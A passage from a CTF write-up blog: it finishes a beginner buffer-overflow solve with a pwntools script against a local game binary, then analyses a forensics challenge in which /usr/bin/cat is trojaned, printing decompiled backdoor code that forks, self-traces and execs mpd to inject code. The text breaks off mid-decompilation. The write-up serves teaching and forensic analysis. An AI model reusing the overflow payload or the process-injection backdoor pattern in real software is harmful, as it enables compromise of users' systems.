+<span class="p">[</span> <span class="err">#</span><span class="mi">1</span><span class="p">]</span> <span class="mh">0x7ffff7c29f75</span> <span class="o">&lt;</span><span class="n">__libc_start_call_main</span><span class="o">+</span><span class="mh">0x75</span><span class="o">&gt;</span>
+<span class="p">[</span> <span class="err">#</span><span class="mi">2</span><span class="p">]</span> <span class="mh">0x7ffff7c2a027</span> <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0x87</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">frame</span> <span class="n">name</span><span class="o">:</span> <span class="n">__libc_start_main_impl</span><span class="p">)</span>
+<span class="p">[</span> <span class="err">#</span><span class="mi">3</span><span class="p">]</span> <span class="mh">0x5555555550f1</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">+</span><span class="mh">0x21</span><span class="o">&gt;</span>
+<span class="o">-----------------------------------------------------------------------------</span>
+<span class="n">gef</span><span class="o">&gt;</span> 
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">monster_hp</span>
+<span class="err">$</span><span class="mi">7</span> <span class="o">=</span> <span class="mh">0x424242</span>
+</code></pre></div></div>
+
+<p>success!</p>
+
+<p>now, we want to entirely zero out the monster’s hp. we do this by writing nullbytes. we’ll want to write 28 filler characters, then 3 nullbytes.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./main"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"YOUR INPUT &gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">" &gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">28</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>we first connect to our process, then pick the option that lets us set personas (2). afterwards, we send our payload of 28 ‘A’ bytes and 3 null bytes.</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">p.interactive()</code> drops us into any interactive shell that the program might create (for this challenge it’s not necessary, but it’s good practice).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>/disturbing-the-peace/sol<span class="o">)</span> <span class="o">&gt;</span> python solve.py
+<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./main'</span>: pid 388773
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+
+<span class="o">!!</span> The monster lunges! It does 100 damage.
+Leader, are you okay?
+
+You<span class="s1">'ve defeated the monster! Good job, leader!
+blahaj{https://www.youtube.com/watch?v=SKwkvsnUOAk}
+</span></code></pre></div></div>
+
+<ul>
+  <li>note: we definitely could have just spammed nullbytes and won! there’s nothing in the buffer that we necessarily need to preserve, so just sending 32 null bytes would work. however, there are some harder pwn challenges which necessitate a certain degree of finesse and care in your payload writing, so it’s good practice to do so.</li>
+</ul>
+
+<h2 id="forensleep-to-dream-0-solves">foren/sleep-to-dream, 0 solves</h2>
+
+<blockquote>
+  <p><strong>Author:</strong> wrenches</p>
+
+  <p><em>Expected Difficulty: insane</em></p>
+
+  <p>someone’s installed a backdoor into the Number One Fiona Apple Fan’s computer! where’s the backdoor?</p>
+</blockquote>
+
+<p>the previous writeup was a beginner friendly introduction to pwn. i will aim to keep this writeup beginner friendly as well, but this was a significantly harder challenge that got no human solves during the ctf.</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">dist</code> is a 5GB zip, consisting of a memory dump and an .E01 file.</p>
+
+<p>some background - a memory dump is exactly that: a dump of the RAM at some point in time while the computer is running. to interact w/ a dump (specifically, a Linux memory dump), we use the tool <a href="https://github.com/volatilityfoundation/volatility3">volatility</a>. for the .E01 file, that’s a proprietary image file format by EnCase, a digital forensics company.</p>
+
+<ul>
+  <li>also this writeup will detail the process of solving this challenge on Linux, and not on Windows.</li>
+</ul>
+
+<p>in essence, what we have is a dump of the system’s memory, as well as the entire contents of the system’s hard-drive.</p>
+
+<h3 id="stage-0-setup">STAGE 0: SETUP</h3>
+
+<p>we deal with the hard drive first. given it’s an .E01 file, we need to convert it into a format that we can easily deal with. we do this w/ <code class="language-plaintext highlighter-rouge">ewfexport</code>, a utility provided by the <code class="language-plaintext highlighter-rouge">ewf-tools</code> package.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>tting/sleep-to-dream/dist<span class="o">)</span> <span class="o">&gt;</span> ewfexport sleep-to-dream.E01 
+ewfexport 20140816
+
+Information <span class="k">for </span><span class="nb">export </span>required, please provide the necessary input
+Export to format <span class="o">(</span>raw, files, ewf, smart, ftk, encase1, encase2, encase3, encase4, encase5, encase6, encase7, encase7-v2, linen5, linen6, linen7, ewfx<span class="o">)</span> <span class="o">[</span>raw]: 
+Target path and filename without extension or - <span class="k">for </span>stdout: 
+Target is required, please try again or terminate using Ctrl^C.
+Target path and filename without extension or - <span class="k">for </span>stdout: output
+Evidence segment file size <span class="k">in </span>bytes <span class="o">(</span>0 is unlimited<span class="o">)</span> <span class="o">(</span>0 B &lt;<span class="o">=</span> value &lt;<span class="o">=</span> 7.9 EiB<span class="o">)</span> <span class="o">[</span>0 B]: 
+Start <span class="nb">export </span>at offset <span class="o">(</span>0 &lt;<span class="o">=</span> value &lt;<span class="o">=</span> 21474836480<span class="o">)</span> <span class="o">[</span>0]: 
+Number of bytes to <span class="nb">export</span> <span class="o">(</span>0 &lt;<span class="o">=</span> value &lt;<span class="o">=</span> 21474836480<span class="o">)</span> <span class="o">[</span>21474836480]: 
+
+Export started at: Dec 21, 2025 14:53:50
+This could take a <span class="k">while</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>(if you don’t have <code class="language-plaintext highlighter-rouge">ewfexport</code>, install it w/ <code class="language-plaintext highlighter-rouge">sudo apt-get install ewf-tools</code>).</p>
+
+<p>essentially, what this does is convert it into a raw 20GB file, and we can use a tool known as <code class="language-plaintext highlighter-rouge">losetup</code> to treat this file as if it were a hard drive connected to our computer. <code class="language-plaintext highlighter-rouge">losetup</code> is short for <code class="language-plaintext highlighter-rouge">loop device setup</code>, and a loop device lets Linux interact with our extracted raw image.</p>
+
+<p>the end goal is to be able to do things like <code class="language-plaintext highlighter-rouge">ls</code>, <code class="language-plaintext highlighter-rouge">cat</code>, so on and so forth in our disk image, and this is how we are able to achieve that.</p>
+
+<p>after <code class="language-plaintext highlighter-rouge">ewfexport</code> finishes, we now have the following file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette (tting/sleep-to-dream/dist) &gt; file output.raw        
+output.raw: DOS/MBR boot sector
+</code></pre></div></div>
+
+<p>this tells us that our disk image has a partition table. a <strong>partition table</strong> means that different parts of the hard drive are used for different purposes. we can see the entries in the partition table below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>tting/sleep-to-dream/dist<span class="o">)</span> <span class="o">&gt;</span> fdisk <span class="nt">-l</span> output.raw
+Disk output.raw: 20 GiB, 21474836480 bytes, 41943040 sectors
+Units: sectors of 1 <span class="k">*</span> 512 <span class="o">=</span> 512 bytes
+Sector size <span class="o">(</span>logical/physical<span class="o">)</span>: 512 bytes / 512 bytes
+I/O size <span class="o">(</span>minimum/optimal<span class="o">)</span>: 512 bytes / 512 bytes
+Disklabel <span class="nb">type</span>: dos
+Disk identifier: 0xa02fda52
+
+Device      Boot    Start      End  Sectors  Size Id Type
+output.raw1 <span class="k">*</span>        2048 39684095 39682048 18.9G 83 Linux
+output.raw2      39686142 41940991  2254850  1.1G  f W95 Extd <span class="o">(</span>LBA<span class="o">)</span>
+output.raw5      39686144 41940991  2254848  1.1G 82 Linux swap / Solaris
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">output.raw1</code> is our actual filesystem of interest, while <code class="language-plaintext highlighter-rouge">output.raw5</code> is for swap memory, and i <em>think</em> <code class="language-plaintext highlighter-rouge">output.raw2</code> should be for the bootloader? i’m not sure though. either way, because this is a partitioned disk image, we need to tell <code class="language-plaintext highlighter-rouge">losetup</code> to set up a different loop device for each partition with <code class="language-plaintext highlighter-rouge">sudo losetup -Pf output.raw</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>tting/sleep-to-dream/dist<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">sudo </span>losetup <span class="nt">-Pf</span> output.raw
+                                                                             
+navi@curette <span class="o">(</span>tting/sleep-to-dream/dist<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">ls</span> /dev/loop<span class="k">*</span>         
+/dev/loop0    /dev/loop0p5  /dev/loop3  /dev/loop6
+/dev/loop0p1  /dev/loop1    /dev/loop4  /dev/loop7
+/dev/loop0p2  /dev/loop2    /dev/loop5  /dev/loop-control
+</code></pre></div></div>
+
+<p>the devices in question are <code class="language-plaintext highlighter-rouge">/dev/loop0p...</code>, specifically, <code class="language-plaintext highlighter-rouge">/dev/loop0p1</code>. we now have this file as a device on our system (much like any USB connection), and we can just mount it and read it as a filesystem.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>tting/sleep-to-dream/dist<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">sudo </span>mount /dev/loop0p1 mnt
+navi@curette <span class="o">(</span>tting/sleep-to-dream/dist<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">cd </span>mnt 
+navi@curette <span class="o">(</span>g/sleep-to-dream/dist/mnt<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">ls           
+</span>bin   etc         initrd.img.old  lost+found  opt   run   sys  var
+boot  home        lib             media       proc  sbin  tmp  vmlinuz
+dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
+</code></pre></div></div>
+
+<p>yay! now we can actually begin to do..</p>
+
+<h3 id="stage-1-actual-forensics-work">STAGE 1: ACTUAL FORENSICS WORK</h3>
+
+<p>we’re informed that there’s a backdoor somewhere. we can just peek around the files. on this system, there is a user named <code class="language-plaintext highlighter-rouge">fiona</code>, and her home directory has a <code class="language-plaintext highlighter-rouge">lyrics</code> folder.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>ist/mnt/home/fiona/lyrics<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">ls</span> <span class="nt">-alps</span>     
+total 52
+4 drwxrwxr-x 2 navi navi 4096 Dec 10 14:18  ./
+4 drwx------ 4 navi navi 4096 Dec 10 15:11  ../
+4 <span class="nt">-rw-rw-r--</span> 1 navi navi 1375 Dec 10 14:27 <span class="s1">'10 - Pale September.txt'</span>
+4 <span class="nt">-rw-rw-r--</span> 1 navi navi 1901 Dec 10 14:27 <span class="s1">'1 - Sleep to Dream.txt'</span>
+4 <span class="nt">-rw-rw-r--</span> 1 navi navi  717 Dec 10 14:27 <span class="s1">'2 - Sullen Girl.txt'</span>
+4 <span class="nt">-rw-rw-r--</span> 1 navi navi 1207 Dec 10 14:27 <span class="s1">'3 - Shadowboxer.txt'</span>
+4 <span class="nt">-rw-rw-r--</span> 1 navi navi  128 Dec 10 14:28 <span class="s1">'4 - Criminal.txt'</span>
+4 <span class="nt">-rw-rw-r--</span> 1 navi navi 1141 Dec 10 14:27 <span class="s1">'5 - Slow Like Honey.txt'</span>
+4 <span class="nt">-rw-rw-r--</span> 1 navi navi  905 Dec 10 14:27 <span class="s1">'6 - The First Taste.txt'</span>
+4 <span class="nt">-rw-rw-r--</span> 1 navi navi 1556 Dec 10 14:27 <span class="s1">'7 - Never Is A Promise.txt'</span>
+4 <span class="nt">-rw-rw-r--</span> 1 navi navi  923 Dec 10 14:27 <span class="s1">'8 - The Child is Gone.txt'</span>
+4 <span class="nt">-rw-rw-r--</span> 1 navi navi 1031 Dec 10 14:27 <span class="s1">'9 - Pale September.txt'</span>
+4 <span class="nt">-rwxrwxr-x</span> 1 navi navi  126 Dec 10 14:27  read_lyrics.sh
+</code></pre></div></div>
+
+<p>everything here seems mostly innocuous, except for the fact that <code class="language-plaintext highlighter-rouge">4 - Criminal.txt</code> is entirely nulled out.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>ist/mnt/home/fiona/lyrics<span class="o">)</span> <span class="o">&gt;</span> xxd 4<span class="se">\ </span>-<span class="se">\ </span>Criminal.txt 
+00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+</code></pre></div></div>
+
+<p>the script just reads all the files in the directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>ist/mnt/home/fiona/lyrics<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">cat </span>read_lyrics.sh 
+<span class="c">#!/bin/bash</span>
+<span class="k">for </span>file <span class="k">in</span> <span class="k">*</span>.txt<span class="p">;</span> <span class="k">do</span>
+    <span class="o">[</span> <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span> <span class="o">]</span> <span class="o">||</span> <span class="k">continue
+    </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">------</span><span class="se">\n</span><span class="nv">$file</span><span class="se">\n</span><span class="s2">------</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="nb">cat</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<p>so, the backdoor is relatively nonobvious. as the challenge author i intended there to be a level of ingenuity required with being able to identify the backdoor, as i hid it quite well. there are two different ways to identify the backdoor, both of which require some baseline knowledge of linux filesystems:</p>
+
+<h4 id="thing-one-modified-times">THING ONE: MODIFIED TIMES</h4>
+
+<p>on a linux filesystem, we can see what times files were last modified. on a clean install of Linux, most of the system’s files (such as those in <code class="language-plaintext highlighter-rouge">/usr/bin</code>, <code class="language-plaintext highlighter-rouge">/sys</code>, <code class="language-plaintext highlighter-rouge">/etc</code>) will <em>NOT</em> have recent last modified times.</p>
+
+<p>we can sort each file on the system by their last modified time:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>tting/sleep-to-dream/dist<span class="o">)</span> <span class="o">&gt;</span> find mnt <span class="nt">-type</span> f <span class="nt">-printf</span> <span class="s1">'%T@ %p\n'</span> | <span class="nb">sort</span> <span class="nt">-nr</span> | <span class="nb">head
+</span>1765460694.1095551690 mnt/var/log/journal/afbcd40694474a8dbe124bf51e279e7e/system.journal
+1765460693.7295586580 mnt/usr/bin/cat
+1765460672.6543820000 mnt/var/lib/systemd/timesync/clock
+1765460661.6619593080 mnt/etc/ssh/sshd_config
+1765460617.4080000000 mnt/var/log/wtmp.db
+1765460614.9120000000 mnt/etc/resolv.conf
+1765460614.9040000000 mnt/var/lib/dhcpcd/ens3.lease
+1765460608.2440000000 mnt/var/log/wtmp
+1765460608.1640000000 mnt/boot/grub/grubenv
+1765460607.6320000000 mnt/var/lib/systemd/random-seed
+</code></pre></div></div>
+
+<ul>
+  <li>now is a good time to discuss Good Usecases for LLMs as opposed to Bad Ones. me personally, i can’t write this command myself because i don’t know the syntax off the top of my head, so i just tell the LLM to write a command that will find all last modified times, sort them, and then give me the first few. i find that using LLMs sparingly like this in these contexts saves time, is quite useful for keeping me on track, and most importantly, <strong>still keeps me knowledgeable as to what the fuck i am doing</strong>. if at any point you realize you do not know what you are doing anymore, then that probably means you should put the chatgpt down.</li>
+</ul>
+
+<p>indeed, we can see that the most recently modified file is <code class="language-plaintext highlighter-rouge">/usr/bin/cat</code>. hm!</p>
+
+<h4 id="thing-two-file-hashes">THING TWO: FILE HASHES</h4>
+
+<p>i won’t go over the process of doing this because it’s annoying to do. but given that this is a Linux filesystem, most of the file hashes of things in <code class="language-plaintext highlighter-rouge">/usr/bin</code> should be the same. if anyone has changed anything in those folders, you would be able to compare them with a fresh install of Linux, and then find any outliers. a tool like VirusTotal is quite nice for this, let’s take a binary that we know is not backdoored and calculate its sum.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette (to-dream/dist/mnt/usr/bin) &gt; md5sum xz  
+1ce5746fe096041370ea72d622b0de74  xz
+</code></pre></div></div>
+
+<p>putting this value into VirusTotal:</p>
+
+<p><img src="https://i.imgur.com/skniJ8g.png" alt="virustotal" /></p>
+
+<p>VirusTotal tells us that this is a file distributed by Linux itself. we’re good!</p>
+
+<h3 id="stage-2-reversing-the-backdoor">STAGE 2: REVERSING THE BACKDOOR</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette (to-dream/dist/mnt/usr/bin) &gt; file cat 
+cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=89b3f1cc0ac8fdb8546615ff55fd4525b6182f50, for GNU/Linux 3.2.0, not stripped
+</code></pre></div></div>
+
+<p>unfortunately now it’s time to do some reverse engineering. throw this into your favorite decompiler and jump into the <code class="language-plaintext highlighter-rouge">main()</code> function.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="err">}</span>
+  <span class="n">pbVar11</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+  <span class="n">local_19c</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">;</span>
+  <span class="n">local_198</span> <span class="o">=</span> <span class="n">param_2</span><span class="p">;</span>
+  <span class="n">initialize</span><span class="p">(</span><span class="n">param_2</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="n">set_program_name</span><span class="p">(</span><span class="o">*</span><span class="n">param_2</span><span class="p">);</span>
+  <span class="n">setlocale</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="s">""</span><span class="p">);</span>
+  <span class="n">bindtextdomain</span><span class="p">(</span><span class="s">"coreutils"</span><span class="p">,</span><span class="s">"/usr/local/share/locale"</span><span class="p">);</span>
+  <span class="n">textdomain</span><span class="p">(</span><span class="s">"coreutils"</span><span class="p">);</span>
+  <span class="n">atexit</span><span class="p">(</span><span class="n">close_stdout</span><span class="p">);</span>
+  <span class="n">local_186</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="n">local_187</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="n">local_1a0</span> <span class="o">=</span> <span class="p">(</span><span class="n">local_1a0</span><span class="p">.</span><span class="n">_2_2_</span> <span class="o">&amp;</span> <span class="mh">0xff00</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x10</span><span class="p">;</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="n">iVar5</span> <span class="o">=</span> <span class="n">getopt_long</span><span class="p">(</span><span class="n">local_19c</span><span class="p">,</span><span class="n">local_198</span><span class="p">,</span><span class="s">"benstuvAET"</span><span class="p">,</span><span class="n">long_options</span><span class="p">.</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar5</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">iVar6</span> <span class="o">=</span> <span class="n">fstat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_158</span><span class="p">);</span>
+      <span class="n">iVar5</span> <span class="o">=</span> <span class="n">optind</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar6</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">uVar15</span> <span class="o">=</span> <span class="n">dcgettext</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">"standard output"</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
+        <span class="n">piVar17</span> <span class="o">=</span> <span class="n">__errno_location</span><span class="p">();</span>
+        <span class="n">auVar25</span> <span class="o">=</span> <span class="n">error</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="o">*</span><span class="n">piVar17</span><span class="p">,</span><span class="n">uVar15</span><span class="p">);</span>
+        <span class="n">uVar15</span> <span class="o">=</span> <span class="n">uStack_1d8</span><span class="p">;</span>
+        <span class="n">uStack_1d8</span> <span class="o">=</span> <span class="n">auVar25</span><span class="p">.</span><span class="n">_0_8_</span><span class="p">;</span>
+        <span class="n">__libc_start_main</span><span class="p">(</span><span class="n">main</span><span class="p">,</span><span class="n">uVar15</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_1d0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">auVar25</span><span class="p">.</span><span class="n">_8_8_</span><span class="p">,</span><span class="o">&amp;</span><span class="n">uStack_1d8</span><span class="p">);</span>
+        <span class="k">do</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Do nothing block with infinite loop */</span>
+        <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+      <span class="p">}</span>
+</code></pre></div></div>
+
+<p>from a glance, it’s not obvious where the backdoor might be. a useful thing to do is compare and contrast with the actual source code of <code class="language-plaintext highlighter-rouge">cat</code>, which is located in GNU’s <code class="language-plaintext highlighter-rouge">coreutils</code> <a href="https://github.com/coreutils/coreutils/blob/master/src/cat.c">repository</a>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">{</span><span class="n">GETOPT_HELP_OPTION_DECL</span><span class="p">},</span>
+    <span class="p">{</span><span class="n">GETOPT_VERSION_OPTION_DECL</span><span class="p">},</span>
+    <span class="p">{</span><span class="n">nullptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">}</span>
+  <span class="err">}</span><span class="p">;</span>
+
+  <span class="n">initialize_main</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">argc</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">argv</span><span class="p">);</span>
+  <span class="n">set_program_name</span> <span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+  <span class="n">setlocale</span> <span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
+  <span class="n">bindtextdomain</span> <span class="p">(</span><span class="n">PACKAGE</span><span class="p">,</span> <span class="n">LOCALEDIR</span><span class="p">);</span>
+  <span class="n">textdomain</span> <span class="p">(</span><span class="n">PACKAGE</span><span class="p">);</span>
+
+  <span class="cm">/* Arrange to close stdout if we exit via the
+     case_GETOPT_HELP_CHAR or case_GETOPT_VERSION_CHAR code.
+     Normally STDOUT_FILENO is used rather than stdout, so
+     close_stdout does nothing.  */</span>
+  <span class="n">atexit</span> <span class="p">(</span><span class="n">close_stdout</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>in the original source, the function is called <code class="language-plaintext highlighter-rouge">initialize_main</code>, but in our decompilation, it’s called <code class="language-plaintext highlighter-rouge">initialize</code>.</p>
+
+<p>decompiling that function specifically:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">initialize</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">uVar2</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">iVar3</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">__pid</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">lVar4</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="o">*</span><span class="n">puVar5</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="o">*</span><span class="n">puVar6</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="o">*</span><span class="n">puVar7</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">uVar8</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_6ec</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_6e8</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">uStack_6e0</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_6d8</span> <span class="p">[</span><span class="mi">213</span><span class="p">];</span>
+  <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
+  
+  <span class="n">uVar8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">puVar5</span> <span class="o">=</span> <span class="n">local_6d8</span><span class="p">;</span>
+  <span class="n">puVar6</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">DAT_00108a40</span><span class="p">;</span>
+  <span class="n">puVar7</span> <span class="o">=</span> <span class="n">puVar5</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">lVar4</span> <span class="o">=</span> <span class="mh">0xd5</span><span class="p">;</span> <span class="n">lVar4</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">lVar4</span> <span class="o">=</span> <span class="n">lVar4</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">*</span><span class="n">puVar7</span> <span class="o">=</span> <span class="o">*</span><span class="n">puVar6</span><span class="p">;</span>
+    <span class="n">puVar6</span> <span class="o">=</span> <span class="n">puVar6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">puVar7</span> <span class="o">=</span> <span class="n">puVar7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">iVar3</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">"4 - Criminal.txt"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">uVar8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">__pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+    <span class="n">local_6e8</span> <span class="o">=</span> <span class="s">"/usr/bin/mpd"</span><span class="p">;</span>
+    <span class="n">uStack_6e0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">uVar8</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
+      <span class="n">lVar4</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">lVar4</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">uVar8</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">execve</span><span class="p">(</span><span class="s">"/usr/bin/mpd"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_6e8</span><span class="p">,(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">waitpid</span><span class="p">(</span><span class="n">__pid</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_6ec</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+      <span class="n">lVar4</span> <span class="o">=</span> <span class="n">get_entry_point</span><span class="p">(</span><span class="n">__pid</span><span class="p">);</span>
+      <span class="n">lVar4</span> <span class="o">=</span> <span class="n">lVar4</span> <span class="o">-</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">puVar5</span><span class="p">;</span>
+      <span class="k">do</span> <span class="p">{</span>
